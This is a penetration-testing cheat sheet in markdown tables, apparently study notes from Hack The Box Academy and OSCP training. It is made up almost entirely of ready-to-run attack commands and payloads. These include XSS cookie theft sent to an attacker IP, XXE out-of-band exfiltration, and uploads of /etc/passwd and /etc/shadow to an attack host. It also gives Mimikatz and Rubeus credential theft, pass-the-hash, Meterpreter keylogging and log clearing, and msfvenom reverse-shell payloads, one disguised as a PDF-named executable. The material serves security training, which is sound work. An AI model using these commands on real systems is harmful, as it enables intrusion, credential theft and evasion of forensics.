| `CVE-2003-0812` | ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 |

| `CVE-2003-0818` | ms04_007_killbill - vulnerability in the bit string decoding code in the Microsoft ASN.1 library |

| `CVE-2003-0822` | ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 |

| `CVE-2004-0206` | ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service |

| `CVE-2010-3138` | EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse |

| `CVE-2010-3147` | EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse |

| `CVE-2010-3970` | ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution |

| `CVE-2011-1345` | Internet Explorer does not properly handle objects in memory - allows remote execution of code via object |

| `CVE-2011-5046` | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |

| `CVE-2012-4349` | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |

| ``sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`` | Uses `CrackMapExec` and the `--local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |



## General

### Unsorted

| Command | Description |
| ------- | ----------- |

| `**Commands**` | **Description** |

| `-------------------------------------------------------------------` | -------------------------------------------------------- |

| `[crt.sh](https://crt.sh/)` | Online subdomain finder |

| ``curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .`` | Certificate transparency. |

| ``dig any inlanefreight.com`` | DNS Records |

| `[Domain Dossier](https://centralops.net/co/domaindossier.aspx)` | Investigate domains and IP Addresses |

| `[Shodan](https://shodan.io)` | Search engine for Internet-connected devices |

| `[SecurityTrails](https://securitytrails.com)` | DNS/Historical DNS data |

| `[DNSDumpster](https://dnsdumpster.com)` | Discover hosts relating to domain |

| `[Subdomain Finder](https://subdomainfinder.c99.nl/)` | Find subdomains of given domain |

| `Google Dorks:` |  |

| ``site:*.domain.com.au -inurl:www`` | Find forth level domain. add additional \*. to go beyond |

| ````site:"target[.]com" ext:log  ext:txt  ext:conf ext:cnf ext:ini  ext:env  ext:sh  ext:bak  ext:backup  ext:swp  ext:old  ext:~  ext:git  ext:svn  ext:htpasswd  ext:htaccess ```` | Dork for fun extensions |

| `[Whoxy](https://www.whoxy.com/)` | Whois/ReverseWhois (Owner, Keyword, Companyname) |

| `-------------------------------------------` | ------------------------------------------------------------------------------------------------------ |

| `[Domain.glass](https://domain.glass/)` | Third-party providers such as domain.glass can also tell us a lot about the company's infrastructure. |

| `Wappalyzer` | Extension |

| `[Gray](https://buckets.grayhatwarfare.com/)` | Another very useful provider is GrayHatWarfare. We can do many different searches, discover AWS, Azure |

| `[Builtwith](https://builtwith.com/)` | Discover underlying tech on website |

| `**Command**` | **Description** |

| `-------------------------------------------------` | --------------------------------------------------- |

| ``snmpwalk -v2c -c <community string> <FQDN/IP>`` | Querying OIDs using snmpwalk. |

| ``onesixtyone -c community-strings.list <FQDN/IP>`` | Bruteforcing community strings of the SNMP service. |

| ``braa <community string>@<FQDN/IP>:.1.*`` | Bruteforcing SNMP service OIDs. |

| `---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

| ``mysql -u root -pP4SSw0rd -h 10.129.14.128`` | Interaction with the MySQL Server |

| ``sudo mysql -Ns -u USER -p -h oscp.exam -e "SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !='';" `` | selects a substring of the authentication_string column for users with the 'mysql_native_password' plugin, excluding rows with a specific invalid password and empty passwords. The result is a list of hashed passwords |

| ``SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.erver_pricipal b ON a.grantor_principal_id = b.principal_ID WHERE a.permission_name = 'IMPERSONATE'`` | Find users who can be impersonated within current DB |

| ``SELECT srvname, isremote FROM sysservers`` | Get remote/linked SQL servers |

| ``EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]`` | Get information from remote server from above step. Can also be used for local |

| ``execute ('select * from openrowset(bulk ''c:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV];`` | Read file execute on remote/linked server |

| `-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------- |

| ``mssqlclient.py <user>@<FQDN/IP> -windows-auth`` | Log in to the MSSQL server using Windows authentication. |

| ``auxiliary/scanner/mssql/mssql_ping`` | MSFconsole module returns info on pingable database such as hostname, Version, port etc. |

| ``locate mssqlclient.py`` | Locate mssqlclient.py |

| `--------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------------ |

| ``./odat all -s <IP>`` | Python tool to enumerate/gather information about Oracle database services and components. |

| `SQLPlus` |  |

| ``sqlplus <USERNAME>/<PASSWORD>@<IP>/<SID>;`` | Logon to the database using gathered credentials and SID |

| `ODAT file upload` |  |

| ``echo "Oracle File Upload Test" > testing.txt`` |  |

| ``./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot\\testing.txt ./testing.txt`` |  |

| `-------------------------------------------------------------------` | --------------------------------------------- |

| ``msf6 auxiliary(scanner/ipmi/ipmi_version)`` | IPMI version detection. |

| ``msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`` | Dump IPMI hashes. |

| ``hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`` | crack HP iLO using a factory default password |

| `-----------------------------------------------------------` | ----------------------------------------------------- |

| ``ssh-audit.py <FQDN/IP>`` | Remote security audit against the target SSH service. |

| ``ssh <user>@<FQDN/IP>`` | Log in to the SSH server using the SSH client. |

| ``ssh -i private.key <user>@<FQDN/IP>`` | Log in to the SSH server using private key. |

| ``nc -nv 127.0.0.1 873`` | Probing for Accessible Shares |

| ``rsync -av --list-only rsync://127.0.0.1/dev`` | Enumerating an Open Share |

| `-------------------------------------------------------------` | ----------------------------------------------- |

| ``rdp-sec-check.pl <FQDN/IP>`` | Check the security settings of the RDP service. |

| ``xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`` | Log in to the RDP server from Linux. |

| ``evil-winrm -i <FQDN/IP> -u <user> -p <password>`` | Log in to the WinRM server. |

| ``wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`` | Execute command using the WMI service. |

| `**Resource/Command**` | **Description** |

| `-------------------------------------------------------------------------` | ------------------------------------------------------------------------------------ |

| ``curl -I "http://${TARGET}"`` | Display HTTP headers of the target webserver. |

| ``whatweb -a https://www.facebook.com -v`` | Technology identification. |

| ``Wappalyzer`` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |

| ``wafw00f -v https://$TARGET`` | WAF Fingerprinting. |

| ``Aquatone`` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |

| ``cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000`` | Makes screenshots of all subdomains in the subdomain.list. |

| `------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | --------------------------------------------------------------------------------------------------- |

| `Recommend seclist for wordlist when bruteforcing /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |  |

| ``curl -s http://192.168.10.10 -H "Host: randomtarget.com"`` | Changing the HOST HTTP header to request a specific domain. |

| ``cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done`` | Bruteforcing for possible virtual hosts on the target domain. |

| ``ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612`` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |

| ``ffuf -w /path/to/wordlist.txt:FUZZ -u http://FUZZ.example.com`` | Bruteforcing for vhost using ffuf alternative |

| `----------------------------------------------------------------------------------------------------------------------------------------------------` | ----------------------------------------------------------------------------- |

| `[https://www.zaproxy.org/](https://www.zaproxy.org/)` | Zap |

| ``ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt`` | Discovering files and folders that cannot be spotted by browsing the website. |

| ``ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS`` | Mutated bruteforcing against the target web server. |

| `-------------------------------------------------------------------------------------` | --------------------------------------------- |

| ``curl -IL https://www.inlanefreight.com`` | Grab website banner |

| ``whatweb 10.10.10.121`` | List details about the webserver/certificates |

| ``curl 10.10.10.121/robots.txt`` | List potential directories in `robots.txt` |

| `**State**` | **Description** |

| `---------------` | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `open/filtered` | If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |

| `**Nmap Option**` | **Description** |

| `--------------------` | ---------------------------------------------------------------------- |

| ``10.10.10.0/24`` | Target network range. |

| ``-Pn`` | Disables ICMP Echo Requests |

| ``-n`` | Disables DNS Resolution. |

| ``--packet-trace`` | Shows all packets sent and received. |

| ``--reason`` | Displays the reason for a specific result. |

| ``--disable-arp-ping`` | Disables ARP Ping Requests. |

| ``--dns-server <ns>`` | DNS resolution is performed by using a specified name server. |

| `---------------` | --------------------------------------------------------------------------------- |

| ``-oA filename`` | Stores the results in all available formats starting with the name of "filename". |

| ``-oN filename`` | Stores the results in normal format with the name "filename". |

| ``-oG filename`` | Stores the results in "grepable" format with the name of "filename". |

| ``-oX filename`` | Stores the results in XML format with the name of "filename". |

| `----------------------------` | ------------------------------------------------------------ |

| ``--initial-rtt-timeout 50ms`` | Sets the specified time value as initial RTT timeout. |

| ``--max-rtt-timeout 100ms`` | Sets the specified time value as maximum RTT timeout. |

| ``--min-rate 300`` | Sets the number of packets that will be sent simultaneously. |

| ``-T <0-5>`` | Specifies the specific timing template. |

| `---------------------------------------------------------------------------------------------` | ------------------------------------------------------ |

| `**Firewall and IDS/IPS Evasion Using NMAP**` |  |

| ``ncat -nv --source-port 53 10.129.2.28 50000`` | Connect To The Filtered Port |

| `Command` | Description |

| `Bypasses` |  |

| `Client-Side Bypass` |  |

| ``[CTRL+SHIFT+C]`` | Toggle Page Inspector |

| `Blacklist Bypass` |  |

| ``shell.phtml`` | Uncommon Extension |

| ``shell.pHp`` | Case Manipulation |

| `[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)` | List of PHP Extensions |

| `[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)` | List of ASP Extensions |

| `[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)` | List of Web Extensions |

| `Whitelist Bypass` |  |

| ``shell.jpg.php`` | Double Extension |

| ``shell.php.jpg`` | Reverse Double Extension |

| ``%20, %0a, %00, %0d0a, /, .\, ., …`` | Character Injection - Before/After Extension |

| `Content/Type Bypass` |  |

| `[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)` | List of Web Content-Types |

| `[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)` | List of All Content-Types |

| `[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)` | List of File Signatures/Magic Bytes |

| `Code` | Description |

| ``<script>alert(window.origin)</script>`` | Basic XSS Payload |

| ``<plaintext>`` | Basic XSS Payload |

| ``<script>print()</script>`` | Basic XSS Payload |

| ``<img src="" onerror=alert(window.origin)>`` | HTML-based XSS Payload |

| ``<script>document.body.style.background = "#141d2b"</script>`` | Change Background Color |

| ``<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`` | Change Back4ground Image |

| ``<script>document.title = 'HackTheBox Academy'</script>`` | Change Website Title |

| ``<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`` | Overwrite website's main body |

| ``<script>document.getElementById('urlform').remove();</script>`` | Remove certain HTML element |

| ``<script src="http://OUR_IP/script.js"></script>`` | Load remote script |

| ``<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`` | Send Cookie details to us |

| ``python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`` | Run xsstrike on a url parameter |

| ``sudo nc -lvnp 80`` | Start netcat listener |

| ``sudo php -S 0.0.0.0:80`` | Start PHP server |

| ``<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`` | Define External Entity to a URL |

| ``<!ENTITY xxe SYSTEM "file:///etc/passwd">`` | Define External Entity to a file path |

| ``<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`` | Reading a file through a PHP error |

| ``<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`` | Reading a file OOB exfiltr |

| `----------------------------------------------------------------------------------------------------------` | --------------------------------------------------------- |

| ``wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`` | Download a File Using wget |

| ``curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`` | Download a File Using wget |

| ``curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \| bash`` | Fileless Download with cURL |

| ``wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py \| python3`` | Fileless Download with wget |

| `` |  |

| `**Download with Bash (/dev/tcp)**` |  |

| ``exec 3<>/dev/tcp/10.10.10.32/80`` | Connect to the Target Webserver |

| ``echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`` | HTTP GET Request |

| ``cat <&3`` | Print the Response |

| `**SSH Download / Upload**` |  |

| ``scp plaintext@192.168.49.128:/root/myroot.txt .`` | Linux - Downloading Files Using SCP |

| ``scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`` | File Upload using SCP |

| `**Web Upload**` |  |

| ``python3 -m pip install --user uploadserver`` | Pwnbox - Start Web Server |

| ``openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`` | Pwnbox - Create a Self-Signed Certificate |

| ``mkdir https && cd https`` | Pwnbox - Start Web Server |

| ``python3 -m uploadserver 443 --server-certificate /root/server.pem`` | Pwnbox - Start Web Server |

| ``curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`` | Linux - Upload Multiple Files |

| `**Alternative Web File Transfer Method**` |  |

| ``python3 -m http.server`` | Linux - Creating a Web Server with Python3 |

| ``python2.7 -m SimpleHTTPServer`` | Linux - Creating a Web Server with Python2.7 |

| ``php -S 0.0.0.0:8000`` | Linux - Creating a Web Server with PHP |

| ``ruby -run -ehttpd . -p8000`` | Linux - Creating a Web Server with Ruby |

| ``wget 192.168.49.128:8000/filetotransfer.txt`` | Download the File from the Target Machine onto the Pwnbox |

| `---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ----------------------------------------------------- |

| `**Python**` |  |

| ``python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`` | Python 2 - Download |

| ``python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`` | Python 3 - Download |

| ``python3 -m uploadserver`` | Starting the Python uploadserver Module |

| ``python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`` | Uploading a File Using a Python One-liner |

| `**PHP**` |  |

| ``php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`` | PHP Download with File_get_contents() |

| ``php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`` | PHP Download with Fopen() |

| ``php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' \| bash`` | PHP Download a File and Pipe it to Bash |

| `**Other Languages**` |  |

| ``ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`` | Ruby - Download a File |

| ``perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`` | Perl - Download a File |

| ``cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`` | Download a File Using JavaScript and cscript.exe -CMD |

| `------------------------------------------------------------------------------------------------------------------------` | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `**File Transfer with Netcat and Ncat**` |  |

| ``nc -l -p 8000 > SharpKatz.exe`` | NetCat - Compromised Machine - Listening on Port 8000 |

| ``ncat -l -p 8000 --recv-only > SharpKatz.exe`` | Ncat - Compromised Machine - Listening on Port 8000 |

| ``nc -q 0 192.168.49.128 8000 < SharpKatz.exe`` | Netcat - Attack Host - Sending File to Compromised machine |

| ``ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`` | Ncat - Attack Host - Sending File to Compromised machine |

| ``sudo nc -l -p 443 -q 0 < SharpKatz.exe`` | Attack Host - Sending File as Input to Netcat |

| ``nc 192.168.49.128 443 > SharpKatz.exe`` | Compromised Machine Connect to Netcat to Receive the File |

| ``sudo ncat -l -p 443 --send-only < SharpKatz.exe`` | Attack Host - Sending File as Input to Ncat |

| ``ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`` | Compromised Machine Connect to Ncat to Receive the File |

| ``cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`` | If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/, Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File |

| `[PowerShell Session File Transfer](https://academy.hackthebox.com/module/24/section/161)` |  |

| `**RDP**` |  |

| ``xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`` | Mounting a Linux Folder Using xfreerdp- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session. |

| `---------------------------------------------------------------------------------` | -------------------------------------------- |

| `**File Encryption on Windows**` |  |

| ``Import-Module .\Invoke-AESEncryption.ps1`` | Import Module Invoke-AESEncryption.ps1 -PWSH |

| ``Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`` | File Encryption Example -PWSH |

| `**File Encryption on Linux**` |  |

| ``openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`` | Encrypting /etc/passwd with openssl |

| ``openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`` | Decrypt passwd.enc with openssl |

| `----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini`` | Upload win.ini to our Pwnbox -CMD |

| ``sudo nc -lvnp 80`` | File Received in our Netcat Session |

| ``GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe" `` | Transfer file with GfxDownloadWrapper.exe |

| `**OPENSSL**` |  |

| ``openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`` | Create Certificate in our Pwnbox |

| ``openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`` | Stand up the Server in our Pwnbox |

| ``$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome & Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`` | Download via Chrome user Agent |

| ``openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`` | Download File from the Compromised Machine |

| `**Other Common Living off the Land tools Powershell**` |  |

| ``bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`` | File Download with Bitsadmin |

| ``Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"`` | PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers. DOWNLOAD |

| ``Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql`` | UPLOAD |

| ``certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`` | Download a File with Certutil -CMD |

| `-----------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------ |

| `**Mimikatz - Export Tickets**` | Command Prompt |

| ``mimikatz.exe`` |  |

| ``privilege::debug`` |  |

| ``sekurlsa::tickets /export`` |  |

| `**Rubeus - Export Tickets**` | Command Prompt |

| ``Rubeus.exe dump /nowrap`` |  |

| `**Pass the Key or OverPass the Hash**` |  |

| `Mimikatz - Extract Kerberos Keys` | Command Prompt |

| ``sekurlsa::ekeys`` |  |

| `Mimikatz - Extract Kerberos Keys` |  |

| `Mimikatz - Pass the Key or OverPass the Hash` |  |

| ``sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f`` |  |

| `Rubeus - Pass the Key or OverPass the Hash` |  |

| ``Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`` |  |

| `[Pass the ticket from windows](https://academy.hackthebox.com/module/147/section/1639)` | [Pass The ticket from linux](https://academy.hackthebox.com/module/147/section/1657) |

| `:-----------------------------------------------` | :------------------------------------------------------------------------------------------------------------------------------------------------ |

| ``show exploits`` | Show all exploits within the Framework. |

| ``show payloads`` | Show all payloads within the Framework. |

| ``show auxiliary`` | Show all auxiliary modules within the Framework. |

| ``search <name>`` | Search for exploits or modules within the Framework. |

| ``info`` | Load information about a specific exploit or module. |

| ``use <name>`` | Load an exploit or module (example: use windows/smb/psexec). |

| ``use <number>`` | Load an exploit by using the index number displayed after the search <name> command. |

| ``LHOST`` | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |

| ``RHOST`` | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |

| ``setg <function>`` | Set a specific value globally (for example, LHOST or RHOST). |

| ``show options`` | Show the options available for a module or exploit. |

| ``show targets`` | Show the platforms supported by the exploit. |

| ``set target <number>`` | Specify a specific target index if you know the OS and service pack. |

| ``set payload <payload>`` | Specify the payload to use. |

| ``set payload <number>`` | Specify the payload index number to use after the show payloads command. |

| ``show advanced`` | Show advanced options. |

| ``set autorunscript migrate -f`` | Automatically migrate to a separate process upon exploit completion. |

| ``check`` | Determine whether a target is vulnerable to an attack. |

| ``exploit`` | Execute the module or exploit and attack the target. |

| ``exploit -j`` | Run the exploit under the context of the job. (This will run the exploit in the background.) |

| ``exploit -z`` | Do not interact with the session after successful exploitation. |

| ``exploit -e <encoder>`` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |

| ``exploit -h`` | Display help for the exploit command. |

| ``sessions -l`` | List available sessions (used when handling multiple shells). |

| ``sessions -l -v`` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |

| ``sessions -s <script>`` | Run a specific Meterpreter script on all Meterpreter live sessions. |

| ``sessions -K`` | Kill all live sessions. |

| ``sessions -c <cmd>`` | Execute a command on all live Meterpreter sessions. |

| ``sessions -u <sessionID>`` | Upgrade a normal Win32 shell to a Meterpreter console. |

| ``db_create <name>`` | Create a database to use with database-driven attacks (example: db_create autopwn). |

| ``db_connect <name>`` | Create and connect to a database for driven attacks (example: db_connect autopwn). |

| ``db_destroy`` | Delete the current database. |

| ``db_destroy  <user:password@host:port/database>`` | Delete database using advanced options. |

| `:----------------------------------------------------` | :-------------------------------------------------------------------------------------------- |

| ``help`` | Open Meterpreter usage help. |

| ``run <scriptname>`` | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |

| ``sysinfo`` | Show the system information on the compromised target. |

| ``ls`` | List the files and folders on the target. |

| ``use priv`` | Load the privilege extension for extended Meterpreter libraries. |

| ``ps`` | Show all running processes and which accounts are associated with each process. |

| ``migrate <proc. id>`` | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |

| ``use incognito`` | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |

| ``list_tokens -u`` | List available tokens on the target by user. |

| ``list_tokens -g`` | List available tokens on the target by group. |

| ``impersonate_token <DOMAIN_NAMEUSERNAME>`` | Impersonate a token available on the target. |

| ``steal_token <proc. id>`` | Steal the tokens available for a given process and impersonate that token. |

| ``drop_token`` | Stop impersonating the current token. |

| ``getsystem`` | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |

| ``shell`` | Drop into an interactive shell with all available tokens. |

| ``execute -f <cmd.exe> -i`` | Execute cmd.exe and interact with it. |

| ``execute -f <cmd.exe> -i -t`` | Execute cmd.exe with all available tokens. |

| ``execute -f <cmd.exe> -i -H -t`` | Execute cmd.exe with all available tokens and make it a hidden process. |

| ``rev2self`` | Revert back to the original user you used to compromise the target. |

| ``reg <command>`` | Interact, create, delete, query, set, and much more in the target’s registry. |

| ``setdesktop <number>`` | Switch to a different screen based on who is logged in. |

| ``screenshot`` | Take a screenshot of the target’s screen. |

| ``upload <filename>`` | Upload a file to the target. |

| ``download <filename>`` | Download a file from the target. |

| ``keyscan_start`` | Start sniffing keystrokes on the remote target. |

| ``keyscan_dump`` | Dump the remote keys captured on the target. |

| ``keyscan_stop`` | Stop sniffing keystrokes on the remote target. |

| ``getprivs`` | Get as many privileges as possible on the target. |

| ``uictl enable <keyboard/mouse>`` | Take control of the keyboard and/or mouse. |

| ``background`` | Run your current Meterpreter shell in the background. |

| ``hashdump`` | Dump all hashes on the target. use sniffer Load the sniffer module. |

| ``sniffer_interfaces`` | List the available interfaces on the target. |

| ``sniffer_dump <interfaceID> pcapname`` | Start sniffing on the remote target. |

| ``sniffer_start <interfaceID> packet-buffer`` | Start sniffing with a specific range for a packet buffer. |

| ``sniffer_stats <interfaceID>`` | Grab statistical information from the interface you are sniffing. |

| ``sniffer_stop <interfaceID>`` | Stop the sniffer. |

| ``add_user <username> <password> -h <ip>`` | Add a user on the remote target. |

| ``add_group_user <"Domain Admins"> <username> -h <ip>`` | Add a username to the Domain Administrators group on the remote target. |

| ``clearev`` | Clear the event log on the target machine. |

| ``timestomp`` | Change file attributes, such as creation date (antiforensics measure). |

| ``reboot`` | Reboot the target machine. |

| `----------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------------------------------------------------- |

| ``msfvenom -l payloads`` | List Payloads |

| ``msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`` | Let's build a simple linux stageless payload with msfvenom |

| ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`` | We can also use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. |

| ``sudo nc -lvnp 443`` | Listener |

| `**Metasploit**` |  |

| ``use exploit/windows/smb/psexec`` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |

| ``shell`` | Command used in a meterpreter shell session to drop into a `system shell` |

| ``msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |

| ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |

| ``msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`` | MSFvenom command used to generate a MacOS-based reverse shell payload |

| ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`` | MSFvenom command used to generate a ASP web reverse shell payload |

| ``msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`` | MSFvenom command used to generate a JSP web reverse shell payload |

| ``msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |

| `--------------------------------------------------------------------------` | ----------------------------------------------------------------------------------------------------------------------------------------------- |

